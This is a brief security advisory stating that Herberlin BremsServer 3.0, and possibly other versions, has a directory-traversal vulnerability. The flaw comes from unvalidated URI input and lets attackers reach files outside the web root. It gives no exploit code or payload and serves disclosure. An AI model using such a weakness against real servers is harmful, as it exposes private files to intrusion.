Herberlin BremsServer is prone to a directory-traversal vulnerability. An attacker may exploit this issue to gain access to files residing outside the web server root directory of the affected system. This issue exists due to a failure to validate user specified URI input.

BremsServer 3.0 is vulnerable; other versions may also be affected.
